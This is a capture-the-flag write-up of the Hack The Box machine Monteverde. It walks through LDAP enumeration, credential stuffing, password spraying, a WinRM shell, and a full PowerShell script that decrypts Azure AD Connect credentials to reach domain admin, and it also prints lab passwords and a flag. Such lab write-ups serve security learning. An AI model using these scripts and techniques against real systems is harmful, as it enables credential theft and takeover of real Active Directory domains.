---
title: Monteverde - HTB Writeup
date: 2024-07-30 10:03
categories: [ctf, windows, medium, ad]
tags: [htb, windows, ctf, medium, ad]    # TAG names should be lowercase
---

# Machine Info

Monteverde involve credentials stuffing for initial access and exploiting Azure AD connect for privilege Escalation.

<img  alt="Pasted image 20240730062513" src="https://github.com/user-attachments/assets/057ec1cc-6774-4830-ab55-502ad4ca0491">

# User
## Scanning through Nmap

First, we'll use Nmap to scan the whole network and find out what services are running. With the **-p-** option, we can check all **65535** ports, and by adding **--min-rate 10000**, we can make the scan faster. After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

```shell
$ nmap -p- --min-rate 10000 10.129.25.43 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49736,57368
```

Now let's run a detailed scan on these specific ports using...

```bash
$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49736,57368 -sC -sV -A -T4 10.129.25.43 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-30 05:55:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
57368/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -3s
| smb2-time: 
|   date: 2024-07-30T05:56:12
|_  start_date: N/A
```


## User Enumeration

### Ldap 389

`windapsearch` is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.

I found multiple users using winappsearch.

```bash
$ ./windapsearch.py -d megabank.local -u Guest\\ldapbind -p '' -U --full
```

- **-d** for domain
- **-u** for username
- **-p** for password
- **-U** to enumerate Users
- **--full** to Dump all attributes from LDAP

```bash
sAMAccountName: Guest
sAMAccountName: AAD_987d7f2f57d2 : Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
sAMAccountName: mhope
sAMAccountName: SABatchJobs
sAMAccountName: svc-ata
sAMAccountName: svc-bexec
sAMAccountName: svc-netapp
sAMAccountName: dgalanos
sAMAccountName: roleary
sAMAccountName: smorgan
```

### Credentials Stuffing

I stored user names in a file called user1.txt and perform credential stuffing attack using crackmapexec and found the user **SABatchJobs** password is also **SABatchJobs** on smb.

```bash
$ crackmapexec smb megabank.local  -u user1.txt -p user1.txt
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

### SMB Shares

Then I utilize smbclient tool to enumerate shares and found **users$** share with read permission. 

```bash
| Disk            | Permissions  | Comment                |
|-----------------|--------------|------------------------|
| ADMIN$          | NO ACCESS    | Remote Admin           |
| azure_uploads   | READ ONLY    |                        |
| C$              | NO ACCESS    | Default share          |
| E$              | NO ACCESS    | Default share          |
| IPC$            | READ ONLY    | Remote IPC             |
| NETLOGON        | READ ONLY    | Logon server share     |
| SYSVOL          | READ ONLY    | Logon server share     |
| users$          | READ ONLY    |                        |
```

In SMB Share, there is a file called **azure.xml** was present on mhope user account. I downloaded it to my local account.

```bash
$ smbclient \\\\megabank.local\\users$\\mhope -U 'SABatchJobs%SABatchJobs' 
```

After viewing the content of **azure.xml** file, there i found the password. 

<img  alt="Pasted image 20240729233350" src="https://github.com/user-attachments/assets/36fa919c-8af9-4334-9e2c-e6e0b92be605">

`4n0therD4y@n0th3r$`
### Password Spraying

Using Password Spraying techniques, i discover that the mhope user has that password.

```bash
$ crackmapexec winrm  megabank.local -u user1.txt -p '4n0therD4y@n0th3r$' --continue-on-success
SMB         10.129.228.111  5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.129.228.111  5985   MONTEVERDE       [*] http://10.129.228.111:5985/wsman
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ 
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ 
HTTP        10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\roleary:4n0therD4y@n0th3r$ (Pwn3d!)
HTTP        10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:4n0therD4y@n0th3r$ (Pwn3d!)
```

<img  alt="Pasted image 20240730060109" src="https://github.com/user-attachments/assets/2b6d9370-32e7-4660-acc9-1caaef5a5578">

`mhope : 4n0therD4y@n0th3r$`

## WinRM

Windows Remote Management (WinRM) is a protocol developed by Microsoft, enabling administrators to **manage and control Windows-based systems remotely** Evil-winrm is a tool which use **WinRM** service to get remote shell on the box.

```powershell
$ evil-winrm -i megabank.local -u mhope -p '4n0therD4y@n0th3r$'           
```

- **-i** for IP address
- **-u** for user
- **-p** for password

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> type ../Desktop/user.txt
c73a161954687d3432a06aee82802977
```


# Privilege Escalation

## Enumeration

With a quick enumeration, i discover that the user **mhope** is a member of Azure Admin group.

<img  alt="Pasted image 20240730060536" src="https://github.com/user-attachments/assets/732d1c4a-48b0-4af5-b9b7-5bbeb637300f">

In **Program Files** directory i discover that the Azure AD connect is running.  

<img alt="Pasted image 20240730061119" src="https://github.com/user-attachments/assets/533e35da-b863-4f95-acd1-52da2d924e6b">

### What is Azure AD Connect

The Azure AD Connect service is essentially responsible for **synchronizing things between your local AD domain, and the Azure based domain**. However, to do this it needs privileged credentials for your local domain so that it can perform various operations such as syncing passwords etc.

I found a blog post for Azure AD Connect Privilege Escalation by XPN, he explain this pretty well. [Azure AD Connect for Red Teamers - XPN InfoSec Blog (xpnsec.com)](https://blog.xpnsec.com/azuread-connect-for-redteam/).

#### Exploitation

I copied the script and test it and it break my winrm session. Then is identified that the syntax used in the script is for EXPRESS SQL, i  modified it little bit and get the admin password.

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

<img  alt="Pasted image 20240730062015" src="https://github.com/user-attachments/assets/1241508f-d177-4c65-b3c1-ad16dc8f8c20">

`adminisrator : d0m@in4dminyeah!`

## Shell as Administrator

I utilize psexec tool to get shell as administrator on the box.

<img  alt="Pasted image 20240730062235" src="https://github.com/user-attachments/assets/3806ccb0-6eda-4565-a0f9-a148243418b6">

# Happy Hacking ❤
